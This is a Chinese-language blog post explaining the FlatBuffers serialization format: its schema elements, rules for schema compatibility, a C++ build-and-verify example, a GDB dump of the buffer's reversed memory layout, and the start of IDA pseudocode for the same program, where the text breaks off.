  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/08/Principles%EF%BC%9Aflatbuffers%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/08/08/Principles%EF%BC%9Aflatbuffers%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">Principles：flatbuffers逆向分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-08-08 21:40:52 / Modified: 21:42:32" itemprop="dateCreated datePublished" datetime="2023-08-08T21:40:52+08:00">2023-08-08</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Principles/" itemprop="url" rel="index"><span itemprop="name">Principles</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>12k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>11 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Flatbuffers 简介</strong></p>
<p>FlatBuffers 是一个开源的、跨平台的、高效的、提供了多种语言接口的序列化工具库，实现了与 Protocal Buffers 类似的序列化格式</p>
<p>FlatBuffers 通过 Scheme 文件定义数据结构，在官方网站 <a target="_blank" rel="noopener" href="https://flatbuffers.dev/flatbuffers_guide_tutorial.html">FlatBuffers: Tutorial</a> 中可以找到如下的测试案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> MyGame.Sample;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Color</span>:</span>byte &#123; Red = <span class="number">0</span>, Green, Blue = <span class="number">2</span> &#125;</span><br><span class="line"><span class="keyword">union</span> Equipment &#123; Weapon &#125; <span class="comment">// Optionally add more tables.</span></span><br><span class="line"> </span><br><span class="line">struct Vec3 &#123;</span><br><span class="line">  x:<span class="keyword">float</span>;</span><br><span class="line">  y:<span class="keyword">float</span>;</span><br><span class="line">  z:<span class="keyword">float</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">table Monster &#123;</span><br><span class="line">  pos:Vec3; <span class="comment">// Struct.</span></span><br><span class="line">  mana:<span class="keyword">short</span> = <span class="number">150</span>;</span><br><span class="line">  hp:<span class="keyword">short</span> = <span class="number">100</span>;</span><br><span class="line">  name:<span class="built_in">string</span>;</span><br><span class="line">  friendly:<span class="keyword">bool</span> = <span class="literal">false</span> (deprecated);</span><br><span class="line">  inventory:[ubyte];  <span class="comment">// Vector of scalars.</span></span><br><span class="line">  color:Color = Blue; <span class="comment">// Enum.</span></span><br><span class="line">  weapons:[Weapon];   <span class="comment">// Vector of tables.</span></span><br><span class="line">  equipped:Equipment; <span class="comment">// Union.</span></span><br><span class="line">  path:[Vec3];        <span class="comment">// Vector of structs.</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">table Weapon &#123;</span><br><span class="line">  name:<span class="built_in">string</span>;</span><br><span class="line">  damage:<span class="keyword">short</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">root_type Monster;</span><br></pre></td></tr></table></figure>
<ul>
<li>Table：每个字段都有一个名称，一个类型和一个可选的默认值（默认为 0 / NULL）</li>
<li>Structs：只包含标量或其他结构（没有默认值，其字段也不会被添加或者弃用）</li>
<li>Types：包括标量类型和非标量类型<ul>
<li>标量类型的字段有默认值</li>
<li>非标量的字段 <code>(string/vector/table/enums/structs)</code> 如果没有值的话，默认值为 NULL </li>
</ul>
</li>
<li>Enums：定义一系列命名常量，默认的第一个值是 “0” </li>
<li>Unions：一个 Unions 中可以放置多种类型，共同使用一个内存区域<ul>
<li>可以声明一个 Unions 字段，该字段可以包含对这些类型中的任何一个的引用，即这块内存区域只能由其中一种类型使用</li>
<li>另外还会生成一个带有后缀 <code>_type</code> 的隐藏字段，该字段包含相应的枚举值，从而可以在运行时知道要将哪些类型转换为类型</li>
</ul>
</li>
<li>Root Type：声明了序列化数据的根表 </li>
</ul>
<p>参考：<a target="_blank" rel="noopener" href="https://halfrost.com/flatbuffers_schema/">深入浅出 FlatBuffers 之 Schema (halfrost.com)</a> </p>
<p><strong>Flatbuffers Table</strong></p>
<p>Table 中每个字段都是可选 optional 的，这种机制可以令 Flatbuffers 前向和后向兼容</p>
<p>假设当前 schema 如下： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table &#123; a:<span class="keyword">int</span>; b:<span class="keyword">int</span>; &#125;</span><br></pre></td></tr></table></figure>
<p>在后添加字段： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table &#123; a:<span class="keyword">int</span>; b:<span class="keyword">int</span>; c:<span class="keyword">int</span>; &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>旧的 schema 读取新的数据结构会忽略新字段 c 的存在（不会浪费存储空间），新的 schema 读取旧的数据，将会取到 c 的默认值 </li>
</ul>
<p>在前添加字段： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table &#123; c:<span class="keyword">int</span> a:<span class="keyword">int</span>; b:<span class="keyword">int</span>; &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在前面添加新字段是不允许的，因为这会使 schema 新旧版本不兼容 </li>
</ul>
<p>指定字段 ID 序列：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table &#123; c:<span class="keyword">int</span> (id: <span class="number">2</span>); a:<span class="keyword">int</span> (id: <span class="number">0</span>); b:<span class="keyword">int</span> (id: <span class="number">1</span>); &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>可以手动指定 ID 排序/分组，只要顺序与旧版本相同也是可以兼容的</li>
</ul>
<p>删除字段：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table &#123; a:<span class="keyword">int</span> (deprecated); b:<span class="keyword">int</span>; &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>不能直接从 schema 中删除字段（否则会破坏源代码），可以将需要删除的字段标记为 deprecated</li>
<li>旧的 schema 读取新的数据结构会获得 a 的默认值（因为它不存在）</li>
<li>新的 schema 代码不能读取也不能写入 a，它们将忽略该字段</li>
</ul>
<p>更改字段：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table &#123; a:uint; b:uint; &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果旧数据不包含任何负数，这将是安全的，如果包含了负数，这样改变会出现问题 </li>
<li>不能修改字段名称与字段默认值（否则会破坏所有使用此版本 schema 的代码）</li>
</ul>
<p><strong>Flatbuffers Structs</strong></p>
<p>Structs 只包含标量或其他结构，只要确定以后就不会进行任何更改 </p>
<p>Structs 使用的内存少于 Table，并且访问速度更快，它们总是以串联方式存储在其父对象中，并且不使用虚表</p>
<p>Structs 不提供前向/后向兼容性，占用内存更小 </p>
<p><strong>Flatbuffers 内存布局</strong></p>
<p>测试样例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> Test.Sample;</span><br><span class="line"> </span><br><span class="line">table Monster &#123;</span><br><span class="line">  name:<span class="built_in">string</span>;</span><br><span class="line">  weapon:[Weapon];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">table Weapon &#123;</span><br><span class="line">  key:<span class="built_in">string</span>;</span><br><span class="line">  value:<span class="keyword">int</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">root_type Monster;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;flatbuffers.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;test_generated.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span> <span class="comment">// C++ header file for printing</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span> <span class="comment">// C++ header file for file access</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> Test::Sample;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">flatbuffers::FlatBufferBuilder <span class="title">builder</span><span class="params">(<span class="number">1024</span>)</span></span>;</span><br><span class="line">    <span class="keyword">auto</span> name = builder.<span class="built_in">CreateString</span>(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    <span class="keyword">auto</span> key1 = builder.<span class="built_in">CreateString</span>(<span class="string">&quot;aaaaaaaa&quot;</span>);</span><br><span class="line">    <span class="keyword">auto</span> key2 = builder.<span class="built_in">CreateString</span>(<span class="string">&quot;bbbbbbbb&quot;</span>);</span><br><span class="line">    <span class="keyword">auto</span> key3 = builder.<span class="built_in">CreateString</span>(<span class="string">&quot;cccccccc&quot;</span>);</span><br><span class="line">    <span class="keyword">auto</span> key4 = builder.<span class="built_in">CreateString</span>(<span class="string">&quot;dddddddd&quot;</span>);</span><br><span class="line">    <span class="keyword">auto</span> value1 = <span class="number">0x31</span>;</span><br><span class="line">    <span class="keyword">auto</span> value2 = <span class="number">0x32</span>;</span><br><span class="line">    <span class="keyword">auto</span> value3 = <span class="number">0x33</span>;</span><br><span class="line">    <span class="keyword">auto</span> value4 = <span class="number">0x34</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> weapon1 = <span class="built_in">CreateWeapon</span>(builder,key1,value1);</span><br><span class="line">    <span class="keyword">auto</span> weapon2 = <span class="built_in">CreateWeapon</span>(builder,key2,value2);</span><br><span class="line">    <span class="keyword">auto</span> weapon3 = <span class="built_in">CreateWeapon</span>(builder,key3,value3);</span><br><span class="line">    <span class="keyword">auto</span> weapon4 = <span class="built_in">CreateWeapon</span>(builder,key4,value4);</span><br><span class="line">    std::vector&lt;flatbuffers::Offset&lt;Weapon&gt;&gt; weapons_vector;</span><br><span class="line">    weapons_vector.<span class="built_in">push_back</span>(weapon1);</span><br><span class="line">    weapons_vector.<span class="built_in">push_back</span>(weapon2);</span><br><span class="line">    weapons_vector.<span class="built_in">push_back</span>(weapon3);</span><br><span class="line">    weapons_vector.<span class="built_in">push_back</span>(weapon4);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> weapons = builder.<span class="built_in">CreateVector</span>(weapons_vector);</span><br><span class="line">    <span class="keyword">auto</span> monster = <span class="built_in">CreateMonster</span>(builder,name,weapons);</span><br><span class="line"></span><br><span class="line">    builder.<span class="built_in">Finish</span>(monster);</span><br><span class="line">    <span class="keyword">uint8_t</span> *buf = builder.<span class="built_in">GetBufferPointer</span>();</span><br><span class="line">    <span class="keyword">auto</span> size = builder.<span class="built_in">GetSize</span>();</span><br><span class="line">    <span class="function">flatbuffers::Verifier <span class="title">verifier</span><span class="params">(buf, size)</span></span>;</span><br><span class="line">    <span class="keyword">bool</span> ok = verifier.VerifyBuffer&lt;Monster&gt;(<span class="literal">nullptr</span>);</span><br><span class="line">    <span class="keyword">if</span> (ok)&#123;</span><br><span class="line">        <span class="keyword">auto</span> monster_bk = <span class="built_in">GetMonster</span>(buf);</span><br><span class="line">        <span class="keyword">auto</span> name_bk = monster_bk-&gt;<span class="built_in">name</span>()-&gt;<span class="built_in">c_str</span>();</span><br><span class="line">        <span class="keyword">auto</span> weapons_bk = monster_bk-&gt;<span class="built_in">weapon</span>();</span><br><span class="line">        <span class="keyword">auto</span> key1_bk = weapons_bk-&gt;<span class="built_in">Get</span>(<span class="number">0</span>)-&gt;<span class="built_in">key</span>()-&gt;<span class="built_in">str</span>();</span><br><span class="line">        <span class="keyword">auto</span> key2_bk = weapons_bk-&gt;<span class="built_in">Get</span>(<span class="number">1</span>)-&gt;<span class="built_in">key</span>()-&gt;<span class="built_in">str</span>();</span><br><span class="line">        <span class="keyword">auto</span> key3_bk = weapons_bk-&gt;<span class="built_in">Get</span>(<span class="number">2</span>)-&gt;<span class="built_in">key</span>()-&gt;<span class="built_in">str</span>();</span><br><span class="line">        <span class="keyword">auto</span> key4_bk = weapons_bk-&gt;<span class="built_in">Get</span>(<span class="number">3</span>)-&gt;<span class="built_in">key</span>()-&gt;<span class="built_in">str</span>();</span><br><span class="line">        <span class="keyword">auto</span> value1_bk = weapons_bk-&gt;<span class="built_in">Get</span>(<span class="number">0</span>)-&gt;<span class="built_in">value</span>();</span><br><span class="line">        <span class="keyword">auto</span> value2_bk = weapons_bk-&gt;<span class="built_in">Get</span>(<span class="number">1</span>)-&gt;<span class="built_in">value</span>();</span><br><span class="line">        <span class="keyword">auto</span> value3_bk = weapons_bk-&gt;<span class="built_in">Get</span>(<span class="number">2</span>)-&gt;<span class="built_in">value</span>();</span><br><span class="line">        <span class="keyword">auto</span> value4_bk = weapons_bk-&gt;<span class="built_in">Get</span>(<span class="number">3</span>)-&gt;<span class="built_in">value</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 <code>CreateMonster</code> 处打断点，然后 GDB 调试打印数据如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x5555555702b0</span> ◂— <span class="number">0x9c00000060</span> <span class="comment">/* &#x27;`&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x5555555702b8</span> ◂— <span class="number">0xa000000006</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x5555555702c0</span> ◂— <span class="number">0x4</span></span><br><span class="line">    ......</span><br><span class="line"><span class="number">6</span>c:<span class="number">0360</span>│  <span class="number">0x555555570600</span> ◂— <span class="number">0xc000800000000</span></span><br><span class="line"><span class="number">6</span>d:<span class="number">0368</span>│  <span class="number">0x555555570608</span> ◂— <span class="number">0xffffffbc00080004</span></span><br><span class="line"><span class="number">6</span>e:<span class="number">0370</span>│  <span class="number">0x555555570610</span> ◂— <span class="number">0x400000094</span></span><br><span class="line"><span class="number">6f</span>:<span class="number">0378</span>│  <span class="number">0x555555570618</span> ◂— <span class="number">0x3c00000004</span></span><br><span class="line"><span class="number">70</span>:<span class="number">0380</span>│  <span class="number">0x555555570620</span> ◂— <span class="number">0x1400000024</span> <span class="comment">/* &#x27;$&#x27; */</span></span><br><span class="line"><span class="number">71</span>:<span class="number">0388</span>│  <span class="number">0x555555570628</span> ◂— <span class="number">0xffffffdc00000004</span></span><br><span class="line"><span class="number">72</span>:<span class="number">0390</span>│  <span class="number">0x555555570630</span> ◂— <span class="number">0x3400000034</span> <span class="comment">/* &#x27;4&#x27; */</span></span><br><span class="line"><span class="number">73</span>:<span class="number">0398</span>│  <span class="number">0x555555570638</span> ◂— <span class="number">0x38ffffffe8</span></span><br><span class="line"><span class="number">74</span>:<span class="number">03</span>a0│  <span class="number">0x555555570640</span> ◂— <span class="number">0xfffffff400000033</span> <span class="comment">/* &#x27;3&#x27; */</span></span><br><span class="line"><span class="number">75</span>:<span class="number">03</span>a8│  <span class="number">0x555555570648</span> ◂— <span class="number">0x320000003c</span> <span class="comment">/* &#x27;&lt;&#x27; */</span></span><br><span class="line"><span class="number">76</span>:<span class="number">03b</span>0│  <span class="number">0x555555570650</span> ◂— <span class="number">0x80004000c0008</span></span><br><span class="line"><span class="number">77</span>:<span class="number">03b</span>8│  <span class="number">0x555555570658</span> ◂— <span class="number">0x3800000008</span></span><br><span class="line"><span class="number">78</span>:<span class="number">03</span>c0│  <span class="number">0x555555570660</span> ◂— <span class="number">0x800000031</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line"><span class="number">79</span>:<span class="number">03</span>c8│  <span class="number">0x555555570668</span> ◂— <span class="string">&#x27;dddddddd&#x27;</span></span><br><span class="line"><span class="number">7</span>a:<span class="number">03</span>d0│  <span class="number">0x555555570670</span> ◂— <span class="number">0x800000000</span></span><br><span class="line"><span class="number">7b</span>:<span class="number">03</span>d8│  <span class="number">0x555555570678</span> ◂— <span class="string">&#x27;cccccccc&#x27;</span></span><br><span class="line"><span class="number">7</span>c:<span class="number">03e0</span>│  <span class="number">0x555555570680</span> ◂— <span class="number">0x800000000</span></span><br><span class="line"><span class="number">7</span>d:<span class="number">03e8</span>│  <span class="number">0x555555570688</span> ◂— <span class="string">&#x27;bbbbbbbb&#x27;</span></span><br><span class="line"><span class="number">7</span>e:<span class="number">03f</span>0│  <span class="number">0x555555570690</span> ◂— <span class="number">0x800000000</span></span><br><span class="line"><span class="number">7f</span>:<span class="number">03f</span>8│  <span class="number">0x555555570698</span> ◂— <span class="string">&#x27;aaaaaaaa&#x27;</span></span><br><span class="line"><span class="number">80</span>:<span class="number">0400</span>│     <span class="number">0x5555555706a0</span> ◂— <span class="number">0x400000000</span></span><br><span class="line"><span class="number">81</span>:<span class="number">0408</span>│     <span class="number">0x5555555706a8</span> ◂— <span class="number">0x656d616e</span> <span class="comment">/* &#x27;name&#x27; */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>首先在 Flatbuffers 的缓冲区中，数据是倒序排列的</li>
<li>从下往上看：在字符串之后，有4字节的 <code>\x00</code> 用于分割 data 和 size，又有4字节的空间用于指示字符串的大小</li>
<li>位于缓冲区最上方的控制信息是实时更新的</li>
</ul>
<p><strong>Flatbuffers 逆向分析</strong></p>
<p>下面先展示一个 IDA 逆向分析出来的伪代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">v3 = flatbuffers::AlignOf&lt;<span class="keyword">unsigned</span> <span class="keyword">long</span>&gt;();</span><br><span class="line">flatbuffers::FlatBufferBuilderImpl&lt;<span class="literal">false</span>&gt;::<span class="built_in">FlatBufferBuilderImpl</span>(&amp;builder, <span class="number">0x400</span>uLL, <span class="number">0LL</span>, <span class="number">0</span>, v3);</span><br><span class="line">name.o = flatbuffers::FlatBufferBuilderImpl&lt;<span class="literal">false</span>&gt;::CreateString&lt;flatbuffers::Offset&gt;(&amp;builder, <span class="string">&quot;name&quot;</span>).o;</span><br><span class="line">key1.o = flatbuffers::FlatBufferBuilderImpl&lt;<span class="literal">false</span>&gt;::CreateString&lt;flatbuffers::Offset&gt;(&amp;builder, <span class="string">&quot;aaaaaaaa&quot;</span>).o;</span><br><span class="line">key2.o = flatbuffers::FlatBufferBuilderImpl&lt;<span class="literal">false</span>&gt;::CreateString&lt;flatbuffers::Offset&gt;(&amp;builder, <span class="string">&quot;bbbbbbbb&quot;</span>).o;</span><br><span class="line">key3.o = flatbuffers::FlatBufferBuilderImpl&lt;<span class="literal">false</span>&gt;::CreateString&lt;flatbuffers::Offset&gt;(&amp;builder, <span class="string">&quot;cccccccc&quot;</span>).o;</span><br><span class="line">key4.o = flatbuffers::FlatBufferBuilderImpl&lt;<span class="literal">false</span>&gt;::CreateString&lt;flatbuffers::Offset&gt;(&amp;builder, <span class="string">&quot;dddddddd&quot;</span>).o;</span><br><span class="line">value1 = <span class="number">49</span>;</span><br><span class="line">value2 = <span class="number">50</span>;</span><br><span class="line">value3 = <span class="number">51</span>;</span><br><span class="line">value4 = <span class="number">52</span>;</span><br><span class="line">weapon1.o = Test::Sample::<span class="built_in">CreateWeapon</span>(&amp;builder, key1, <span class="number">49</span>).o;</span><br><span class="line">weapon2.o = Test::Sample::<span class="built_in">CreateWeapon</span>(&amp;builder, key2, <span class="number">50</span>).o;</span><br><span class="line">weapon3.o = Test::Sample::<span class="built_in">CreateWeapon</span>(&amp;builder, key3, <span class="number">51</span>).o;</span><br><span class="line">weapon4.o = Test::Sample::<span class="built_in">CreateWeapon</span>(&amp;builder, key4, <span class="number">52</span>).o;</span><br><span class="line">std::vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;&gt;::<span class="built_in">vector</span>(&amp;weapons_vector);</span><br><span class="line">std::vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;&gt;::<span class="built_in">push_back</span>(&amp;weapons_vector, &amp;weapon1);</span><br><span class="line">std::vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;&gt;::<span class="built_in">push_back</span>(&amp;weapons_vector, &amp;weapon2);</span><br><span class="line">std::vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;&gt;::<span class="built_in">push_back</span>(&amp;weapons_vector, &amp;weapon3);</span><br><span class="line">std::vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;&gt;::<span class="built_in">push_back</span>(&amp;weapons_vector, &amp;weapon4);</span><br><span class="line">weapons.o = flatbuffers::FlatBufferBuilderImpl&lt;<span class="literal">false</span>&gt;::CreateVector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;,std::allocator&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;&gt;&gt;(</span><br><span class="line">              &amp;builder,</span><br><span class="line">              &amp;weapons_vector).o;</span><br><span class="line">monster.o = Test::Sample::<span class="built_in">CreateMonster</span>(&amp;builder, name, weapons).o;</span><br><span class="line">flatbuffers::FlatBufferBuilderImpl&lt;<span class="literal">false</span>&gt;::Finish&lt;Test::Sample::Monster&gt;(&amp;builder, monster, <span class="number">0LL</span>);</span><br><span class="line">buf = flatbuffers::FlatBufferBuilderImpl&lt;<span class="literal">false</span>&gt;::<span class="built_in">GetBufferPointer</span>(&amp;builder);</span><br><span class="line">size = flatbuffers::FlatBufferBuilderImpl&lt;<span class="literal">false</span>&gt;::<span class="built_in">GetSize</span>(&amp;builder);</span><br><span class="line">flatbuffers::Verifier::<span class="built_in">Verifier</span>(&amp;verifier, buf, size, <span class="number">0x40</span>u, <span class="number">0xF4240</span>u, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> ( flatbuffers::Verifier::VerifyBuffer&lt;Test::Sample::Monster&gt;(&amp;verifier, <span class="number">0LL</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  monster_bk = Test::Sample::<span class="built_in">GetMonster</span>(buf);</span><br><span class="line">  v4 = Test::Sample::Monster::<span class="built_in">name</span>(monster_bk);</span><br><span class="line">  name_bk = flatbuffers::String::<span class="built_in">c_str</span>(v4);</span><br><span class="line">  weapons_bk = Test::Sample::Monster::<span class="built_in">weapon</span>(monster_bk);</span><br><span class="line">  v5 = flatbuffers::Vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;,<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;::<span class="built_in">Get</span>(weapons_bk, <span class="number">0</span>);</span><br><span class="line">  v6 = Test::Sample::Weapon::<span class="built_in">key</span>(v5);</span><br><span class="line">  flatbuffers::String::str[abi:cxx11](&amp;key1_bk, v6);</span><br><span class="line">  v7 = flatbuffers::Vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;,<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;::<span class="built_in">Get</span>(weapons_bk, <span class="number">1u</span>);</span><br><span class="line">  v8 = Test::Sample::Weapon::<span class="built_in">key</span>(v7);</span><br><span class="line">  flatbuffers::String::str[abi:cxx11](&amp;key2_bk, v8);</span><br><span class="line">  v9 = flatbuffers::Vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;,<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;::<span class="built_in">Get</span>(weapons_bk, <span class="number">2u</span>);</span><br><span class="line">  v10 = Test::Sample::Weapon::<span class="built_in">key</span>(v9);</span><br><span class="line">  flatbuffers::String::str[abi:cxx11](&amp;key3_bk, v10);</span><br><span class="line">  v11 = flatbuffers::Vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;,<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;::<span class="built_in">Get</span>(weapons_bk, <span class="number">3u</span>);</span><br><span class="line">  v12 = Test::Sample::Weapon::<span class="built_in">key</span>(v11);</span><br><span class="line">  flatbuffers::String::str[abi:cxx11](&amp;key4_bk, v12);</span><br><span class="line">  v13 = flatbuffers::Vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;,<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;::<span class="built_in">Get</span>(weapons_bk, <span class="number">0</span>);</span><br><span class="line">  value1_bk = Test::Sample::Weapon::<span class="built_in">value</span>(v13);</span><br><span class="line">  v14 = flatbuffers::Vector&lt;flatbuffers::Offset&lt;Test::Sample::Weapon&gt;,<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;::<span class="built_in">Get</span>(weapons_bk, <span class="number">1u</span>);</span><br><span class="line">  